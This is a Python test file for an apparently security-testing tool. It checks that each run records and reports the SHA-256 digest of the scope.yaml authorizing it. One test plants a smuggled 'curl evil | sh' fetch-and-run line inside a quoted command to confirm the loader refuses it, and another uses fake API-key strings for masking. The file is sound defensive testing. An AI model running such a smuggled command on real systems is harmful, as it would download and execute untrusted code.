"""A run records which authorization record it ran under (threat model S4, audit D-17).

`scope_hash()` existed and had no caller, so no run said which scope.yaml authorized it. The
digest is now computed over the bytes that were loaded, kept in the run store's context (every
scope that authorized traffic of the run, in order) and printed in all four report formats.
"""

from __future__ import annotations

import json
import sqlite3
from contextlib import closing
from pathlib import Path

import pytest
from typer.testing import CliRunner, Result

from ildottore.cli.app import app
from ildottore.policy.scope import load_scope_with_digest, scope_hash
from ildottore.redactor import Redactor
from ildottore.reporting.masking import mask_run
from ildottore.shared.models import TestRun

_SCOPE = (
    'version: "1.0"\ntargets:\n  - id: mock-target\n    base_url: "mock://mock-target"\n'
    '    endpoints:\n      - host: "mock-target"\n        path_prefixes: ["/"]\n'
    '    identities:\n      - name: default\n        auth_ref: "env://NONE"\n'
)


def _workspace(tmp_path: Path) -> tuple[Path, Path]:
    scope = tmp_path / "scope.yaml"
    scope.write_text(_SCOPE)
    target = tmp_path / "target.yaml"
    target.write_text("id: mock-target\ntype: chatbot\nmock_scenario: bare\n")
    return target, scope


def test_the_digest_is_of_what_was_loaded_and_matches_a_checksum(tmp_path: Path) -> None:
    _, scope = _workspace(tmp_path)
    loaded, digest = load_scope_with_digest(scope)
    assert digest == scope_hash(scope) and len(digest) == 64
    scope.write_text(_SCOPE + f"checksum: {digest}\n")
    assert load_scope_with_digest(scope)[1] == digest, "the checksum line is not part of it"
    assert loaded.targets[0].id == "mock-target"


def test_every_report_and_the_run_store_name_the_scope(tmp_path: Path) -> None:
    target, scope = _workspace(tmp_path)
    digest = scope_hash(scope)
    db = tmp_path / "runs.sqlite"
    result = CliRunner().invoke(
        app,
        [
            "run", "-t", str(target), "--scope", str(scope), "--quick",
            "--evidence-root", str(tmp_path / "ev"), "--run-db", str(db),
            "-oA", str(tmp_path / "report"), "--no-color",
        ],
    )  # fmt: skip
    assert result.exit_code in (0, 1, 2), result.output
    report = json.loads((tmp_path / "report.json").read_text())
    assert report["run"]["scope_sha256"] == digest
    assert digest in (tmp_path / "report.html").read_text()
    sarif = json.loads((tmp_path / "report.sarif").read_text())
    assert sarif["runs"][0]["properties"]["scope_sha256"] == digest
    assert f'name="scope_sha256" value="{digest}"' in (tmp_path / "report.xml").read_text()
    with closing(sqlite3.connect(db)) as conn:
        (context,) = conn.execute("SELECT context_json FROM runs").fetchone()
    assert json.loads(context)["scope_sha256s"] == [digest]


def _scopes(db: Path, run_id: str = "run-abc123def456") -> list[str]:
    with closing(sqlite3.connect(db)) as conn:
        (context,) = conn.execute(
            "SELECT context_json FROM runs WHERE run_id = ?", (run_id,)
        ).fetchone()
    return list(json.loads(context)["scope_sha256s"])


def test_each_scope_of_a_run_is_recorded_in_order_and_said(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    from ildottore.cli.run import _record_scope

    db = tmp_path / "runs.sqlite"
    a, b = "a" * 64, "b" * 64
    for digest in (a, a, b, b, a):  # a resume under B, then back under A
        _record_scope(db, "run-abc123def456", digest, resumed=True)
    assert _scopes(db) == [a, b, a]
    notes = capsys.readouterr().err.splitlines()
    assert len(notes) == 2 and all(f"started under scope sha256 {a[:12]}" in n for n in notes)
    assert f"last ran under {b[:12]}" in notes[1], "the return to A names B, the scope it left"


def test_a_run_recorded_before_scopes_were_kept_says_so(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    from ildottore.cli.run import _record_scope
    from ildottore.store.run_sqlite import SqliteRunStore

    db = tmp_path / "runs.sqlite"
    with SqliteRunStore(db) as store:
        store.save_run_context("run-abc123def456", context={"target_digest": "t", "runs": 1})
    _record_scope(db, "run-abc123def456", "c" * 64, resumed=True)
    assert _scopes(db) == ["unrecorded", "c" * 64]
    assert "before scope digests were recorded" in capsys.readouterr().err


def test_writing_the_context_keeps_the_scope_list(tmp_path: Path) -> None:
    from ildottore.cli.run import _persist_run_integrity, _record_scope
    from ildottore.shared.models import Target

    db = tmp_path / "runs.sqlite"
    target = Target(id="mock-target", type="chatbot")  # type: ignore[arg-type]
    _persist_run_integrity(db, "run-abc123def456", [], target=target, mock_scenario=None, runs=1)
    _record_scope(db, "run-abc123def456", "d" * 64, resumed=False)  # a fresh run: no marker
    _persist_run_integrity(db, "run-abc123def456", [], target=target, mock_scenario=None, runs=1)
    assert _scopes(db) == ["d" * 64]


def test_the_digest_is_of_the_text_that_was_parsed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A second read of a file that changed in between would hash the wrong record."""

    import hashlib

    _, scope = _workspace(tmp_path)
    reads = iter([_SCOPE, _SCOPE + "# edited after the load\n"])
    monkeypatch.setattr(Path, "read_text", lambda self, encoding=None: next(reads))
    _, digest = load_scope_with_digest(scope)
    assert digest == hashlib.sha256(_SCOPE.encode()).hexdigest()


def test_an_indented_checksum_line_is_covered(tmp_path: Path) -> None:
    """Only the top-level key is left out: an indented `checksum:` line inside a value counts."""

    _, scope = _workspace(tmp_path)
    base = scope_hash(scope)
    scope.write_text(_SCOPE + "    checksum: an indented line is not the top-level key\n")
    assert scope_hash(scope) != base


def _recipe(raw: bytes) -> str:
    """The MANUAL recipe, literally: UTF-8, CRLF and lone CR to LF, column-0 `checksum:` lines
    deleted with their LF, the rest hashed."""

    import hashlib
    import re

    text = raw.decode("utf-8").replace("\r\n", "\n").replace("\r", "\n")
    lines = re.split(r"(?<=\n)", text)
    body = "".join(line for line in lines if not line.startswith("checksum:"))
    return hashlib.sha256(body.encode("utf-8")).hexdigest()


@pytest.mark.parametrize("newline", ["\n", "\r\n", "\r"])
@pytest.mark.parametrize("final", [True, False])
def test_the_documented_recipe_reproduces_the_digest(
    tmp_path: Path, newline: str, final: bool
) -> None:
    _, scope = _workspace(tmp_path)
    digest = load_scope_with_digest(scope)[1]
    text = (_SCOPE + f"checksum: {digest}" + ("\n" if final else "")).replace("\n", newline)
    scope.write_bytes(text.encode("utf-8"))
    loaded = load_scope_with_digest(scope)[1]
    assert loaded == digest == _recipe(scope.read_bytes())


def test_a_checksum_line_smuggled_into_a_quoted_command_is_refused(tmp_path: Path) -> None:
    """Both versions had one digest before the re-parse check, and the second authorized a
    different command line (the stdio adapter runs no shell, so the text is extra arguments)."""

    from ildottore.policy.errors import ScopeError

    benign = _SCOPE + '    commands:\n      - "python srv.py\n        --port 1"\n'
    evil = benign.replace("python srv.py\n", "python srv.py\nchecksum: ; curl evil | sh\n")
    scope = tmp_path / "scope.yaml"
    scope.write_text(benign)
    loaded, _digest = load_scope_with_digest(scope)
    assert loaded.targets[0].commands == ["python srv.py --port 1"]
    scope.write_text(evil)
    with pytest.raises(ScopeError, match="part of another value"):
        load_scope_with_digest(scope)


def test_masking_keeps_a_digest_and_masks_anything_else() -> None:
    redactor = Redactor(salt="s")
    digest = "0123456789abcdef" * 4
    assert mask_run(TestRun(run_id="r", scope_sha256=digest), redactor).scope_sha256 == digest
    for leaked in (
        "sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz0123456789",
        "sk-" + "a" * 64,
        digest + "-v2",
    ):
        assert mask_run(TestRun(run_id="r", scope_sha256=leaked), redactor).scope_sha256 != leaked


# --- delta audit of D-17 -------------------------------------------------------------------


def test_a_checksum_line_inside_a_quoted_value_is_refused(tmp_path: Path) -> None:
    """A quoted value may continue at column 0; dropping that line changed the value."""

    from ildottore.policy.errors import ScopeError

    scope = tmp_path / "scope.yaml"
    scope.write_text(
        _SCOPE.replace("      - name: default\n", '      - name: "default\nchecksum: x"\n')
    )
    with pytest.raises(ScopeError, match="part of another value"):
        load_scope_with_digest(scope)


def test_a_unicode_line_break_does_not_hide_part_of_a_value(tmp_path: Path) -> None:
    """`str.splitlines` cut at U+0085 too, so two values had one digest."""

    scope = tmp_path / "scope.yaml"
    digests = set()
    for tail in ("1", "2"):
        name = f'      - name: "default\u0085checksum: --port {tail}"\n'
        scope.write_text(_SCOPE.replace("      - name: default\n", name), encoding="utf-8")
        digests.add(load_scope_with_digest(scope)[1])
    assert len(digests) == 2


def _append_in_process(args: tuple[str, int]) -> None:
    from ildottore.store.run_sqlite import SqliteRunStore

    db, worker = args
    for i in range(20):
        with SqliteRunStore(Path(db)) as store:
            store.add_run_scope("run-abc123def456", f"{worker:02d}{i:02d}" + "0" * 60)


def test_concurrent_resumes_lose_no_scope(tmp_path: Path) -> None:
    """Without one immediate transaction, appends from concurrent processes were lost (audit)."""

    import multiprocessing

    from ildottore.store.run_sqlite import SqliteRunStore

    db = tmp_path / "runs.sqlite"
    SqliteRunStore(db).close()  # an existing store, as on a resume: creating one is not raced
    with multiprocessing.get_context("spawn").Pool(8) as pool:
        pool.map(_append_in_process, [(str(db), w) for w in range(8)])
    assert len(_scopes(db)) == 160


def _halted_run(tmp_path: Path) -> tuple[Path, Path, Path, str]:
    """A real fresh `-sV` run cut by its request ceiling, so it can be resumed."""

    target, scope = _workspace(tmp_path)
    db = tmp_path / "runs.sqlite"
    result = CliRunner().invoke(
        app,
        [
            "run", "-t", str(target), "--scope", str(scope), "--quick", "-sV",
            "--budget-requests", "40", "--run-db", str(db),
            "--evidence-root", str(tmp_path / "ev"), "--no-color",
        ],
    )  # fmt: skip
    assert result.exit_code == 3 and "budget ceiling reached" in result.output, result.output
    with closing(sqlite3.connect(db)) as conn:
        (run_id,) = conn.execute("SELECT run_id FROM runs").fetchone()
    return target, scope, db, run_id


def _resume(
    target: Path, scope: Path, db: Path, run_id: str, tmp_path: Path, *extra: str
) -> Result:
    return CliRunner().invoke(
        app,
        [
            "run", "-t", str(target), "--scope", str(scope), "--quick", "-sV", *extra,
            "--resume", run_id, "--run-db", str(db),
            "--evidence-root", str(tmp_path / "ev"), "--no-color",
        ],
    )  # fmt: skip


def test_a_dry_run_or_estimate_of_a_resume_records_nothing(tmp_path: Path) -> None:
    target, scope, db, run_id = _halted_run(tmp_path)
    first = _scopes(db, run_id)
    scope.write_text(scope.read_text() + "# scope B\n")
    for flag in ("--dry-run", "--estimate"):
        result = _resume(target, scope, db, run_id, tmp_path, flag)
        assert result.exit_code == 0, result.output
    assert _scopes(db, run_id) == first


def test_a_resume_with_sv_records_its_scope_before_the_probe_pass(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from ildottore.cli import wiring

    target, scope, db, run_id = _halted_run(tmp_path)
    scope.write_text(scope.read_text() + "# scope B\n")
    seen: list[list[str]] = []

    def spy(*_args: object, **_kwargs: object) -> object:
        seen.append(_scopes(db, run_id))
        raise wiring.ProbeCeilingHit(0, "stopped by the test")

    monkeypatch.setattr(wiring, "fingerprint_probe", spy)
    _resume(target, scope, db, run_id, tmp_path)
    assert seen and len(seen[0]) == 2, "scope B was recorded before the first probe"


def test_resuming_a_run_recorded_before_scopes_marks_it_before_the_probes(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from ildottore.cli import wiring

    target, scope, db, run_id = _halted_run(tmp_path)
    with closing(sqlite3.connect(db)) as conn:  # as a run from before this change left it
        (raw,) = conn.execute("SELECT context_json FROM runs").fetchone()
        context = json.loads(raw)
        del context["scope_sha256s"]
        conn.execute("UPDATE runs SET context_json = ?", (json.dumps(context),))
        conn.commit()
    seen: list[list[str]] = []

    def spy(*_args: object, **_kwargs: object) -> object:
        seen.append(_scopes(db, run_id))
        raise wiring.ProbeCeilingHit(0, "stopped by the test")

    monkeypatch.setattr(wiring, "fingerprint_probe", spy)
    _resume(target, scope, db, run_id, tmp_path)
    assert seen and seen[0][0] == "unrecorded"
